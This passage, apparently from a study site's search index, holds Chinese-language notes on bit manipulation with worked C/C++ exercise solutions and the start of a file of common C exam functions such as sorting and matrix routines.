x&amp;(x+1)\u628a\u53f3\u8d77\u7684\u7b2c\u4e00\u4e2a 0 0 0 \u53d8\u4e3a 1 1 10011 \u2212 &gt; 0111 0011-&gt;0111 0011\u2212&gt;0111x \u2223 ( x + 1 ) x|(x+1) x\u2223(x+1)\u628a\u53f3\u8d77\u8fde\u7eed\u7684 0 0 0 \u53d8\u4e3a 1 1 11000 \u2212 &gt; 1111 1000-&gt;1111 1000\u2212&gt;1111\uff0c\u6ce8\u610f\u662f\u53f3\u8d77\u8fde\u7eed\u7684 0 0 0x \u2223 ( x \u2212 1 ) x|(x-1) x\u2223(x\u22121)\u53d6\u53f3\u8fb9\u8fde\u7eed\u7684 1 1 11011 \u2212 &gt; 0011 1011-&gt;0011 1011\u2212&gt;0011( x \u2227 ( x + 1 ) ) &gt; &gt; 1 (x\\wedge (x+1))&gt;&gt;1 (x\u2227(x+1))&gt;&gt;1\u53bb\u6389\u53f3\u8d77\u7684\u7b2c\u4e00\u4e2a 1 1 1 \u7684\u5de6\u8fb91101 \u2212 &gt; 0001 1101-&gt;0001 1101\u2212&gt;0001x &amp; ( x \u2227 ( x \u2212 1 ) ) x\\&amp;(x\\wedge (x-1)) x&amp;(x\u2227(x\u22121)) <p>\u5f53\u7136\uff0c\u8fd9\u91cc\u53ea\u662f\u4e00\u4e9b\u5e38\u7528\u7684\uff0c\u5e76\u4e0d\u662f\u5168\u90e8\uff0c\u4f4d\u8fd0\u7b97\u7684\u795e\u5947\u8fdc\u4e0d\u6b62\u4e8e\u6b64\u3002</p>"},{"location":"DEC/C/%E4%BD%8D%E8%BF%90%E7%AE%97%E6%80%BB%E7%BB%93/#4","title":"4 \u8d1f\u6570\u7684\u4f4d\u8fd0\u7b97","text":"<p>\u9996\u5148\uff0c\u6211\u4eec\u8981\u77e5\u9053\uff0c\u5728\u8ba1\u7b97\u673a\u4e2d\uff0c\u8fd0\u7b97\u662f\u4f7f\u7528\u7684\u4e8c\u8fdb\u5236\u8865\u7801\uff0c\u800c\u6b63\u6570\u7684\u8865\u7801\u662f\u5b83\u672c\u8eab\uff0c\u8d1f\u6570\u7684\u8865\u7801\u5219\u662f\u7b26\u53f7\u4f4d\u4e0d\u53d8\uff0c\u5176\u4f59\u6309\u4f4d\u53d6\u53cd\uff0c\u6700\u540e\u518d + 1 +1 +1 \u5f97\u5230\u7684\uff0c \u4f8b\u5982\uff1a</p> <p>15 15 15, \u539f\u7801: 00001111 \u00a0 00001111\\space 00001111\u00a0\u8865\u7801: 00001111 00001111 00001111</p> <p>\u2212 15 -15 \u221215, \u539f\u7801: 10001111 \u00a0 10001111\\space 10001111\u00a0\u8865\u7801: 11110001 11110001 11110001</p> <p>\u90a3\u4e48\u5bf9\u4e8e\u8d1f\u6570\u7684\u4f4d\u8fd0\u7b97\u800c\u8a00\uff0c\u5b83\u4eec\u7684\u64cd\u4f5c\u90fd\u662f\u5efa\u7acb\u5728\u8865\u7801\u4e0a\u7684\uff0c\u5f97\u5230\u7684\u8fd0\u7b97\u7ed3\u679c\u662f\u8865\u7801\uff0c\u6700\u540e\u5c06\u8865\u7801\u7ed3\u679c\u8f6c\u5316\u6210\u4e00\u4e2a\u666e\u901a\u7684\u5341\u8fdb\u5236\u6570\u7ed3\u679c\u3002\u4f46\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7b26\u53f7\u4f4d\u662f\u9700\u8981\u53c2\u4e0e\u8fd0\u7b97\u7684\uff0c\u800c\u5728\u5de6\u79fb\u53f3\u79fb\u64cd\u4f5c\u4e2d\uff0c\u8d1f\u6570\u53f3\u79fb\u8865 1 1 1\uff0c\u5de6\u79fb\u53f3\u8fb9\u8865 0 0 0\u3002\u4f8b\u5982\u5bf9\u4e8e \u2212 15 -15 \u221215\uff0c\u5176\u8865\u7801\u4e3a 11110001 , 11110001, 11110001, \u53f3\u79fb\u4e00\u4f4d ( \u2212 15 &gt; &gt; 1 ) (-15&gt;&gt;1) (\u221215&gt;&gt;1) \u5f97\u5230\u7684\u662f 11111000 11111000 11111000\uff0c\u5373 \u2212 8 -8 \u22128\uff0c\u5176\u4ed6\u7684\u540c\u7406\u3002</p> <p>\u8fd9\u91cc\u6211\u4eec\u4ecb\u7ecd\u51e0\u4e2a\u7279\u6b8a\u7684\u6027\u8d28\uff1a</p> <ul> <li> <p>\u5feb\u901f\u5224\u65ad\u662f\u5426\u4e3a \u2212 1 -1 \u22121</p> <p>\u5728\u94fe\u5f0f\u524d\u5411\u661f\u4e2d\uff0c\u6211\u4eec\u521d\u59cb\u5316 h e a d head head \u6570\u7ec4\u4e3a \u2212 1 -1 \u22121\uff0c\u6700\u540e\u5224\u65ad\u662f\u5426\u904d\u5386\u5b8c u u u \u7684\u6240\u6709\u8fb9\u65f6\uff0c\u5373\u5224\u65ad i i i \u662f\u5426\u4e3a \u2212 1 -1 \u22121\uff0c\u6211\u4eec\u76f4\u63a5\u7528 \u223c i \\sim i \u223ci \u5373\u53ef\u3002\u539f\u56e0\u5c31\u5728\u4e8e \u2212 1 -1 \u22121 \u7684\u8865\u7801\u662f 11111111 11111111 11111111\uff0c\u6309\u4f4d\u53d6\u53cd\u5c31\u53d8\u4e3a 00000000 00000000 00000000\uff0c\u8fd9\u5b9e\u9645\u4e0a\u5c31\u662f 0 0 0\u3002</p> </li> <li> <p>\u53d6\u6700\u4f4e\u4f4d\u7684 1 1 1\uff0clowbit \u51fd\u6570</p> <p>\u4e5f\u5c31\u662f x &amp; ( \u2212 x ) x\\&amp;(-x) x&amp;(\u2212x)\uff0c\u8fd9\u5728\u6811\u72b6\u6570\u7ec4\u4e2d\u8d77\u7740\u5de8\u5927\u4f5c\u7528\uff0c\u8fd9\u91cc\u6307\u8def\u4e00\u7bc7\u6811\u72b6\u6570\u7ec4\u8bb2\u89e3 b l o g blog blog: \u70b9\u8fd9\u91cc\uff0c\u6211\u4eec\u6765\u8bc1\u660e\u4e00\u4e0b\uff0c\u8fd9\u91cc\u53d6 x = 15 x=15 x=15\uff0c\u5bf9\u4e8e 15 &amp; ( \u2212 15 ) 15\\&amp;(-15) 15&amp;(\u221215)\uff0c\u6211\u4eec\u77e5\u9053\uff0c\u5728\u8865\u7801\u4e0a\u8fdb\u884c\u8fd0\u7b97\u5f97\u5230\u7684\u662f 00000001 00000001 00000001\uff0c\u9700\u8981\u6ce8\u610f\u4e8c\u5143\u8fd0\u7b97\u7684\u7b26\u53f7\u4f4d\u6211\u4eec\u9700\u8981\u8fdb\u884c\u8fd0\u7b97\u3002</p> </li> </ul>"},{"location":"DEC/C/%E4%BD%8D%E8%BF%90%E7%AE%97%E6%80%BB%E7%BB%93/#5","title":"5 \u4f4d\u8fd0\u7b97\u7684\u4e00\u4e9b\u5e94\u7528","text":"<ul> <li> <p>\u4f4d\u8fd0\u7b97\u5b9e\u73b0\u4e58\u9664\u6cd5</p> <p>\u5c06 x x x \u5de6\u79fb\u4e00\u4f4d\u5b9e\u73b0 \u00d7 2 \\times 2 \u00d72\uff0c\u5c06 x x x \u53f3\u79fb\u4e00\u4f4d\u5b9e\u73b0 \u00f7 2 \\div2 \u00f72\u3002</p> <p>a &lt; &lt; 1 \u2261 a \u2217 2 a&lt;&lt;1 \\equiv a*2 a&lt;&lt;1\u2261a\u22172</p> <p>a &gt; &gt; 1 \u2261 a / 2 a &gt;&gt;1 \\equiv a/2 a&gt;&gt;1\u2261a/2</p> </li> <li> <p>\u4f4d\u8fd0\u7b97\u4ea4\u6362\u4e24\u6574\u6570</p> </li> </ul> Text Only<pre><code>void swap(int &amp;a,int &amp;b){\n      a ^= b;\n      b ^= a;\n      a ^= b;\n  }\n</code></pre> <p>\u8fd9\u6548\u7387\u975e\u5e38\u9ad8\uff0c\u6211\u4eec\u6765\u5256\u6790\u5176\u539f\u7406\uff0c\u5bf9\u4e8e a = a \u2227 b a=a\\wedge b a=a\u2227b\uff0c\u5219 b = b \u2227 ( a \u2227 b ) b = b\\wedge(a\\wedge b) b=b\u2227(a\u2227b)\uff0c\u6839\u636e\u4ea4\u6362\u5f8b\u4ee5\u53ca\u5f02\u6216\u6027\u8d28\uff0c\u5f97 b = b \u2227 b \u2227 a = 0 \u2227 a = a b=b\\wedge b\\wedge a=0\\wedge a=a b=b\u2227b\u2227a=0\u2227a=a\uff0c\u540c\u7406 a = ( a \u2227 b ) \u2227 a = 0 \u2227 b = b a=(a\\wedge b)\\wedge a=0\\wedge b=b a=(a\u2227b)\u2227a=0\u2227b=b\u3002\u8fd9\u6837\u5c31\u5b9e\u73b0\u4e86\u4ea4\u6362\u64cd\u4f5c\u3002</p> <ul> <li> <p>\u4f4d\u8fd0\u7b97\u5224\u65ad\u5947\u5076\u6570</p> <p>\u6211\u4eec\u77e5\u9053\uff0c\u5728\u4e8c\u8fdb\u5236\u4e2d\uff0c\u6700\u4f4e\u4f4d\u51b3\u5b9a\u4e86\u662f\u5947\u6570\u8fd8\u662f\u5076\u6570\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u63d0\u53d6\u51fa\u6700\u4f4e\u4f4d\u7684\u503c\uff0c\u5373\u4e0e 1 1 1 \u76f8\u4e0e\u5373\u53ef\u5b9e\u73b0\u76ee\u7684\uff0c\u4e3a 0 0 0 \u5219\u662f\u5076\u6570\uff0c\u4e3a 1 1 1 \u5219\u662f\u5947\u6570\u3002</p> </li> <li> <p>\u4f4d\u8fd0\u7b97\u6539\u53d8\u6b63\u8d1f\u6027\u548c\u6c42\u7edd\u5bf9\u503c</p> </li> </ul> Text Only<pre><code>int change(int a){\n    return ~ a + 1;\n}\n</code></pre> <p>\u5bf9\u4e8e\u6b63\u6570\u800c\u8a00\uff0c\u8865\u7801\u5c31\u662f\u539f\u7801\uff0c\u6240\u4ee5\u6309\u4f4d\u53d6\u53cd\u518d + 1 +1 +1 \u5219\u5f97\u5230\u5bf9\u5e94\u771f\u503c\u8d1f\u6570\u7684\u8865\u7801\uff0c\u800c\u5bf9\u4e8e\u8d1f\u6570\uff0c\u5176\u8865\u7801\u8fdb\u884c\u6309\u4f4d\u53d6\u53cd\u518d + 1 +1 +1 \u5219\u5f97\u5230\u5bf9\u5e94\u771f\u503c\u6b63\u6570\u7684\u8865\u7801\uff0c\u53d8\u4e3a\u539f\u7801\u3002\u90a3\u4e48\u77e5\u9053\u8fd9\u4e2a\u6211\u4eec\u5c31\u53ef\u4ee5\u7279\u5224\u662f\u5426\u4e3a\u8d1f\u6570 \uff08\u8fd9\u91cc\u901a\u8fc7\u53f3\u79fb 31 31 31 \u4f4d\uff0c\u82e5\u4e3a\u6b63\u6570\uff0c\u5219\u5f97\u5230\u7684\u662f 0 0 0\uff0c\u82e5\u4e3a\u8d1f\u6570\uff0c\u5219\u5f97\u5230\u7684\u662f \u2212 1 -1 \u22121\uff0c\u800c 0 0 0 \u7684\u8865\u7801\u4e3a 0000 0000 0000, \u2212 1 -1 \u22121 \u7684\u8865\u7801\u4e3a 1111 1111 1111\uff0c~\u6839\u636e\u5f02\u6216\u6027\u8d28\u5373\u53ef\u5224\u65ad~\u611f\u8c22\u8bfb\u8005 \uff08\u6062\u3002\uff09\u6307\u51fa\u9519\u8bef\uff0c\u8fd9\u91cc\u5e94\u8be5\u662f\u8981\u8fdb\u884c\u6309\u4f4d\u53d6\u53cd\u64cd\u4f5c\uff0c\u8fd9\u6837\u5982\u679c\u4e3a\u8d1f\u6570\u5224\u65ad\u7ed3\u679c\u624d\u4e3a 0 \u3002\uff09 \uff0c\u5229\u7528\u6761\u4ef6\u8868\u8fbe\u5f0f\u5c31\u53ef\u4ee5\u6839\u636e\u5224\u65ad\u7ed3\u679c\u6c42\u7edd\u5bf9\u503c\u4e86\u3002\u5982\u4e0b\uff1a</p> Text Only<pre><code>int abs(int a){\n    return ~(a &gt;&gt; 31) ? a : ~a + 1;\n}\n</code></pre> <ul> <li>\u4f4d\u8fd0\u7b97\u5b9e\u73b0\u5bf9 p p p \u53d6\u4f59\uff08p \u4e3a 2 k 2^k 2k\uff09</li> </ul> Text Only<pre><code>int mod(int a,int p){\n    return a &amp; (p - 1);\n}\n</code></pre> <p>\u53d6\u4f59\u5b9e\u9645\u4e0a\u5c31\u662f\u820d\u53bb\u5927\u4e8e\u7b49\u4e8e p p p \u7684\u4f4d\u6570\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u4fdd\u7559\u5728 p p p \u8303\u56f4\u5185\u7684\u6570\u3002\u7531\u4e8e\u6211\u4eec\u9650\u5b9a\u4e86 p p p \u4e3a 2 k 2^k 2k\uff0c\u6240\u4ee5 ( p \u2212 1 ) (p - 1) (p\u22121) \u4e00\u5b9a\u662f\u5c06\u5c0f\u4e8e p p p \u7684\u6700\u9ad8\u4f4d\u5168\u90e8\u53d8\u4e3a\u4e86 1 1 1\uff0c\u8fd9\u6837\u518d\u8fdb\u884c\u4e0e\u64cd\u4f5c\u5373\u53ef\u5f97\u5230\u4f59\u6570\u3002</p> <ul> <li>\u4f4d\u8fd0\u7b97\u7edf\u8ba1\u4e8c\u8fdb\u5236\u6570 1 1 1 \u7684\u4e2a\u6570</li> </ul> Text Only<pre><code>int count(int x){\n    int cnt = 0;\n    while(x){\n        x = x &amp; (x - 1);\n        cnt ++;\n    }\n    return cnt;\n}\n</code></pre> <p>\u5bf9\u4e8e\u4efb\u610f\u7684 x x x\uff0c\u8f6c\u6362\u6210\u4e8c\u8fdb\u5236\u540e\uff0c\u662f\u5f62\u5982\u8fd9\u6837\u7684\u6570\u5b57\uff1a a a . . . a a 10...00 aa...aa10...00 aa...aa10...00\uff0c\u4ece\u53f3\u5411\u5de6\u6570\u6709\u4efb\u610f\u591a\u4e2a 0 0 0\uff0c\u76f4\u5230\u9047\u89c1\u7b2c\u4e00\u4e2a 1 1 1\uff0c\u5b57\u6bcd a a a \u7528\u6765\u5360\u4f4d\uff0c\u4ee3\u8868 1 1 1 \u5de6\u8fb9\u7684\u4efb\u610f\u6570\u5b57\u3002 x \u2212 1 x-1 x\u22121 \u8f6c\u6362\u6210\u4e8c\u8fdb\u5236\u540e\uff0c\u662f\u5f62\u5982\u8fd9\u6837\u7684\u6570\u5b57\uff1a a a . . . a a 01...11 aa...aa01...11 aa...aa01...11\uff0c\u4ece\u53f3\u5411\u5de6\u6570\uff0c\u539f\u6765\u7684\u4efb\u610f\u591a\u4e2a 0 0 0 \u90fd\u53d8\u6210 1 1 1\uff0c\u539f\u6765\u7684\u7b2c\u4e00\u4e2a 1 1 1\uff0c\u53d8\u6210 0 0 0\uff0c\u5b57\u6bcd a a a \u90e8\u5206\u4e0d\u53d8\u3002\u5bf9 x x x \u548c x \u2212 1 x-1 x\u22121 \u8fdb\u884c \u6309\u4f4d\u4e0e \u8ba1\u7b97\uff0c\u4f1a\u5f97\u5230\uff1a a a . . . a a 00...00 aa...aa00...00 aa...aa00...00\uff0c\u4ece\u53f3\u5411\u5de6\u6570\uff0c\u539f\u6765\u7684\u7b2c\u4e00\u4e2a 1 1 1 \u53d8\u6210\u4e86 0 0 0\uff0c\u5b57\u6bcd a \u90e8\u5206\u4e0d\u53d8\u3002\u6240\u4ee5 x &amp; ( x \u2212 1 ) x \\&amp; (x-1) x&amp;(x\u22121) \u76f8\u5f53\u4e8e\u6d88\u9664\u4e86 x x x \u4ece\u53f3\u5411\u5de6\u6570\u9047\u5230\u7684\u7b2c\u4e00\u4e2a 1 1 1\u3002\u90a3\u4e48\uff0c x x x \u8f6c\u6362\u6210\u4e8c\u8fdb\u5236\u540e\u5305\u542b\u591a\u5c11\u4e2a 1 1 1\uff0ccount \u51fd\u6570\u91cc\u7684\u5faa\u73af\u5c31\u4f1a\u8fdb\u884c\u591a\u5c11\u6b21\uff0c\u76f4\u5230 x x x \u6240\u6709\u7684 1 1 1 \u90fd\u88ab \u201c\u6d88\u9664\u201d\u3002</p>"},{"location":"DEC/C/%E4%BD%8D%E8%BF%90%E7%AE%97%E6%80%BB%E7%BB%93/#6","title":"6 \u4f4d\u8fd0\u7b97\u4f8b\u9898","text":""},{"location":"DEC/C/%E4%BD%8D%E8%BF%90%E7%AE%97%E6%80%BB%E7%BB%93/#61","title":"6.1 \u66f4\u65b0\u4e8c\u8fdb\u5236\u4f4d","text":"<ul> <li> <p>\u9898\u9762</p> <p>\u7ed9\u51fa\u4e24\u4e2a 32 \u4f4d\u7684\u6574\u6570 N \u548c M\uff0c\u4ee5\u53ca\u4e24\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u7684\u4f4d\u7f6e i \u548c j\u3002\u5199\u4e00\u4e2a\u65b9\u6cd5\u6765\u4f7f\u5f97 N \u4e2d\u7684\u7b2c i \u5230 j \u4f4d\u7b49\u4e8e M\uff08M \u4f1a\u662f N \u4e2d\u4ece\u7b2c i \u4e3a\u5f00\u59cb\u5230\u7b2c j \u4f4d\u7684\u5b50\u4e32\uff09</p> <p>\u6837\u4f8b\uff1a</p> Text Only<pre><code>\u8f93\u5165: N=(10000000000)2 M=(10101)2 i=2 j=6\n\u8f93\u51fa: N=(10001010100)2\n\u8f93\u5165: N=(10000000000)2 M=(11111)2 i=2 j=6\n\u8f93\u51fa: N=(10001111100)2\n</code></pre> </li> <li> <p>\u89e3\u9898\u601d\u8def</p> <p>\u7ed3\u5408\u6240\u5b66\uff0c\u6211\u4eec\u7684\u601d\u8def\u5e94\u8be5\u5c31\u662f\u5148\u5c06\u7b2c i i i \u4f4d\u5230\u7b2c j j j \u4f4d\u5168\u90e8\u53d8\u4e3a 0 0 0\uff0c\u518d\u5c06\u4e0e\u5de6\u79fb i i i \u4f4d\u7684 M M M \u8fdb\u884c\u6216\u64cd\u4f5c\u3002</p> </li> <li> <p>AC \u4ee3\u7801</p> </li> </ul> Text Only<pre><code>class Solution {\npublic:\n    int updateBits(int n, int m, int i, int j) {\n        // \u5faa\u73af\u904d\u5386\u4ece\u7b2c i \u4f4d\u5230\u7b2c j \u4f4d\n        for(int pos = i; pos &lt;= j; pos ++ ){\n            // \u5c06 n \u7684\u7b2c pos \u4f4d\u8bbe\u4e3a 0\n            // ~(1 &lt;&lt; pos) \u521b\u5efa\u4e00\u4e2a\u5728\u7b2c pos \u4f4d\u4e3a 0 \u5176\u4ed6\u4f4d\u4e3a 1 \u7684\u63a9\u7801\n            // \u7136\u540e\u4f7f\u7528\u6309\u4f4d\u4e0e\u8fd0\u7b97\u7b26\uff08&amp;\uff09\u6765\u5c06 n \u7684\u7b2c pos \u4f4d\u8bbe\u7f6e\u4e3a 0\n            n &amp;= ~(1 &lt;&lt; pos);\n        }\n        // \u5c06 m \u5de6\u79fb i \u4f4d\uff0c\u4f7f m \u7684\u4f4e\u4f4d\u5bf9\u9f50\u5230 n \u7684\u7b2c i \u4f4d\n        // \u7136\u540e\u4f7f\u7528\u6309\u4f4d\u6216\u8fd0\u7b97\u7b26\uff08|\uff09\u5408\u5e76 n \u548c m\n        // \u8fd9\u6837 n \u7684\u7b2c i \u5230\u7b2c j \u4f4d\u5c31\u88ab m \u7684\u76f8\u5e94\u4f4d\u6240\u66ff\u6362\n        return n | (m &lt;&lt; i);\n    }\n};\n</code></pre>"},{"location":"DEC/C/%E4%BD%8D%E8%BF%90%E7%AE%97%E6%80%BB%E7%BB%93/#62-ab","title":"6.2 A+B \u95ee\u9898","text":"<ul> <li> <p>\u9898\u9762</p> <p>\u7ed9\u51fa\u4e24\u4e2a\u6574\u6570 a \u548c b , \u6c42\u4ed6\u4eec\u7684\u548c\u5e76\u4ee5\u6574\u6570\uff08int\uff09\u7684\u5f62\u5f0f\u8fd4\u56de\u3002\u4e0d\u80fd\u4f7f\u7528 + \u7b49\u6570\u5b66\u8fd0\u7b97\u7b26\u3002</p> <p>\u6837\u4f8b\uff1a</p> <p>\u8f93\u5165\uff1a</p> Text Only<pre><code>a = 1\nb = 2\n</code></pre> <p>\u8f93\u51fa\uff1a</p> <p>\u8f93\u5165\uff1a</p> Text Only<pre><code>a = -1\nb = 1\n</code></pre> <p>\u8f93\u51fa\uff1a</p> </li> <li> <p>\u89e3\u9898\u601d\u8def</p> <p>\u8fd9\u9898\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5f02\u6216\u64cd\u4f5c\u6765\u5b9e\u73b0\uff0c\u56e0\u4e3a\u5f02\u6216\u64cd\u4f5c\u6709\u4e00\u4e2a\u522b\u540d\u53eb\u4e0d\u8fdb\u4f4d\u52a0\u6cd5\u3002\u90a3\u4e48\u8fdb\u4f4d\u64cd\u4f5c\u6211\u4eec\u5b9e\u9645\u4e0a\u5c31\u53ef\u4ee5\u901a\u8fc7 a &amp; b a\\&amp;b a&amp;b \u6765\u5b9e\u73b0\uff0c\u56e0\u4e3a a &amp; b a\\&amp;b a&amp;b \u5f97\u5230\u7684\u90fd\u662f a a a \u548c b b b \u4e0a\u90fd\u6709\u7684 1 1 1\uff0c\u6211\u4eec\u518d\u5de6\u79fb\u5373\u5f97\u5230\u7684\u662f\u8fdb\u4f4d\u4e4b\u540e\u7684\u7ed3\u679c\uff0c\u6240\u4ee5 a + b = ( a \u2227 b ) + ( a &amp; b &lt; &lt;1) a+b=(a\\wedge b)+(a\\&amp;b&lt;&lt;1) a+b=(a\u2227b)+(a&amp;b&lt;&lt;1)\u3002\u901a\u8fc7\u8fd9\u6837\u6a21\u62df\u7ad6\u5f0f\u52a0\u6cd5\u64cd\u4f5c\u5373\u53ef\u3002</p> </li> <li> <p>AC \u4ee3\u7801</p> </li> </ul> Text Only<pre><code>class Solution {\npublic:\n    int aplusb(int a, int b) {\n        // \u5f53\u6ca1\u6709\u8fdb\u4f4d\u9700\u8981\u5904\u7406\u65f6\u5faa\u73af\u7ed3\u675f\n        while(b != 0){\n            // temp_a \u5b58\u50a8 a \u548c b \u7684\u6309\u4f4d\u5f02\u6216\u7ed3\u679c\uff0c\u8fd9\u76f8\u5f53\u4e8e\u4e0d\u5e26\u8fdb\u4f4d\u7684\u52a0\u6cd5\n            int temp_a = a ^ b;\n            // temp_b \u5b58\u50a8 a \u548c b \u7684\u6309\u4f4d\u4e0e\u7ed3\u679c\u5e76\u5de6\u79fb\u4e00\u4f4d\uff0c\u8fd9\u76f8\u5f53\u4e8e\u8ba1\u7b97\u8fdb\u4f4d\n            // \u56e0\u4e3a\u53ea\u6709\u4e24\u4e2a\u4f4d\u90fd\u662f1\u65f6\u624d\u4f1a\u4ea7\u751f\u8fdb\u4f4d\n            int temp_b = (a &amp; b) &lt;&lt; 1;\n\n            // \u66f4\u65b0 a \u4e3a\u4e0d\u5e26\u8fdb\u4f4d\u7684\u52a0\u6cd5\u7ed3\u679c\n            a = temp_a;\n\n            // \u66f4\u65b0 b \u4e3a\u8fdb\u4f4d\n            b = temp_b;\n        }\n        // \u5f53\u6ca1\u6709\u8fdb\u4f4d\u65f6\uff0ca \u4e2d\u5b58\u50a8\u4e86\u6700\u7ec8\u7ed3\u679c\uff0c\u8fd4\u56de a\n        return a;\n    }\n};\n</code></pre>"},{"location":"DEC/C/%E4%BD%8D%E8%BF%90%E7%AE%97%E6%80%BB%E7%BB%93/#63-o1-2","title":"6.3 O(1) \u65f6\u95f4\u68c0\u6d4b 2 \u7684\u5e42\u6b21","text":"<ul> <li> <p>\u9898\u9762</p> <p>\u7528 O(1) \u65f6\u95f4\u68c0\u6d4b\u6574\u6570 n \u662f\u5426\u662f 2 \u7684\u5e42\u6b21\u3002</p> <p>\u6837\u4f8b</p> <p><code>n=4</code>\uff0c\u8fd4\u56de <code>true</code>;</p> <p><code>n=5</code>\uff0c\u8fd4\u56de <code>false</code>.</p> <p>\u6311\u6218</p> <p>O(1) \u65f6\u95f4\u590d\u6742\u5ea6</p> </li> <li> <p>\u89e3\u9898\u601d\u8def</p> <p>\u9996\u5148\u6211\u4eec\u77e5\u9053 2 k 2^k 2k \u662f\u5927\u4e8e 0 0 0 \u7684\uff0c\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u7279\u5224\uff0c\u540c\u7406\uff0c 2 k 2^k 2k \u7684\u4e8c\u8fdb\u5236\u8868\u793a\u4e2d\u53ea\u6709 1 1 1 \u4e2a 1 1 1\uff0c\u6545\u6211\u4eec\u53ef\u4ee5\u5229\u7528 x &amp; ( x \u2212 1 ) x\\&amp;(x-1) x&amp;(x\u22121) \u6765\u6d88\u9664\u552f\u4e00\u7684 1 1 1 \u5224\u65ad\u662f\u5426\u7b49\u4e8e 0 0 0 \u5373\u53ef\u3002</p> </li> <li> <p>AC \u4ee3\u7801</p> </li> </ul> Text Only<pre><code>class Solution {\npublic:\n    bool checkPowerOf2(int n) {\n        // \u68c0\u67e5 n \u662f\u5426\u5927\u4e8e 0\n        // 2 \u7684\u5e42\u5fc5\u987b\u662f\u6b63\u6570\uff0c\u56e0\u4e3a 0 \u548c\u8d1f\u6570\u90fd\u4e0d\u662f 2 \u7684\u5e42\n        // \u68c0\u67e5 n \u548c n - 1 \u7684\u6309\u4f4d\u4e0e\u64cd\u4f5c\u662f\u5426\u4e3a 0\n        // \u5982\u679c n \u662f 2 \u7684\u5e42\uff0c\u5219\u5176\u4e8c\u8fdb\u5236\u8868\u793a\u4e2d\u53ea\u6709\u4e00\u4e2a 1\n        // \u4f8b\u5982 2 (10), 4 (100), 8 (1000)\n        // \u5f53 n \u662f 2 \u7684\u5e42\u65f6\uff0cn - 1 \u7684\u4e8c\u8fdb\u5236\u8868\u793a\u662f n \u7684\u6700\u9ad8\u4f4d 1 \u53d8\u4e3a 0\uff0c\n        // \u5176\u4f59\u4f4d\u4ece 0 \u53d8\u4e3a 1\uff0c\u4f8b\u5982 2 (10) - 1 = 1 (01), 4 (100) - 1 = 3 (011)\n        // \u56e0\u6b64 n &amp; (n - 1) \u5c06\u5f97\u5230 0\n        return n &gt; 0 &amp;&amp; (n &amp; (n - 1)) == 0;\n    }\n};\n</code></pre>"},{"location":"DEC/C/%E5%B8%B8%E8%80%83%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/","title":"C \u8bed\u8a00\u5e38\u8003\u51fd\u6570\u603b\u7ed3","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;math.h&gt;\n\n\n/*\u9009\u62e9\u6392\u5e8f\u2014\u2014\u5143\u7d20p[a]~p[b]\u5347\u5e8f\u6392\u5e8f*/\nvoid selesort(int p[], int a, int b);\n/*\u5192\u6ce1\u6392\u5e8f\u2014\u2014\u6574\u4f53\u5347\u5e8f\u6392\u5e8f*/\nvoid bubsort(int p[], int n);\n/*\u6c42\u4f59\u77e9\u9635\u2014\u2014\u8f93\u5165\u77e9\u9635A\uff0c\u6c42\u5220\u6389\u7b2c0\u5217\u7b2ci\u884c\u7684\u77e9\u9635B\uff0c\u5176\u4e2dB\u662f\u4e00\u4e2a\u7a7a\u7684\u5730\u5740\uff0c\u7528\u6765\u5b58\u653e\u77e9\u9635\u5143\u7d20*/\nvoid smallermatrix(int a[], int b[], int n, int i);\n/*\u6c42n\u9636\u65b9\u9635A\u884c\u5217\u5f0f\u2014\u2014A\u4ee5\u4e00\u7ef4\u6570\u7ec4\u5f62\u5f0f\u8f93\u5165*/\nint det(int a[], int n);\n/* \u5224\u65ad\u7d20\u6570\u2014\u2014\u8f93\u5165\u4e00\u4e2a\u6b63\u6574\u6570n,\u662f\u7d20\u6570\u8fd4\u56de1\uff0c\u4e0d\u662f\u8fd4\u56de0 */\nint sushu(int n);\n/* \u77e9\u9635\u76f8\u4e58\u2014\u2014\u8f93\u5165\u4e00\u7ef4\u6570\u7ec4A m*n, B n*p, \u7a7a\u7684\u5df2\u7ecf\u7533\u8bf7\u597d\u7684\u6570\u7ec4C m*p\uff0c\u5c06A*B\u653e\u5728C\u4e2d */\nvoid matrixmul(int a[], int b[], int c[], int m, int n, int p);\n/* \u77e9\u9635\u8f6c\u7f6e\u2014\u2014\u8f93\u5165\u4e00\u7ef4\u6570\u7ec4A m*n,\u7a7a\u7684\u5df2\u7ecf\u7533\u8bf7\u597d\u7684\u6570\u7ec4C n*m\uff0c\u5c06A\u8f6c\u7f6e\u653e\u5728C\u4e2d */\nvoid matrixtran(int a[], int c[], int m, int n);\n\n\n\n/*\u9009\u62e9\u6392\u5e8f\u2014\u2014\u5143\u7d20p[a]~p[b]\u5347\u5e8f\u6392\u5e8f*/\nvoid selesort(int p[], int a, int b)\n{\n    int i, j, k;\n    int d;                       //\u7528\u6765\u4ea4\u6362\u7684\u53d8\u91cf\n    for (i = a; i &lt;= b - 1; i++) //\u5bf9\u6700\u540e\u4e00\u4e2a\u5143\u7d20p[n-1]\u4e0d\u7528\u64cd\u4f5c\n    {\n        k = i; //\u8bb0\u5f55\u73b0\u5728\u5230\u54ea\u91cc\u4e86\n        for (j = i + 1; j &lt;= b; j++)\n            if (p[j] &lt; p[k])\n                k = j; //\u4ecei\u7684\u4e0b\u4e00\u4e2a\u5f00\u59cb\u627e\uff0c\u5982\u679c\u6709\u6bd4i\u5c0f\u5143\u7d20\uff08\u7b2cj\u4e2a\uff09\u7684\u5c31\u8ba9k\u4e3aj\n                       //\u672c\u8d28\u76ee\u7684\u662f\u627e\u51fai\u540e\u9762\u6700\u5c0f\u7684\u4e00\u4e2a\n        if (k != i)    //\u5982\u679ci\u9879\u4e0d\u662f\u6700\u5c0f\u7684\uff0c\u90a3\u4e48\u6362\uff01\n        {\n            d = p[i];\n            p[i] = p[k];\n            p[k] = d;\n        }\n    }\n}\n\n\n/*\u5192\u6ce1\u6392\u5e8f\u2014\u2014\u6574\u4f53\u5347\u5e8f\u6392\u5e8f*/\nvoid bubsort(int p[], int n)\n{\n    int m, k; 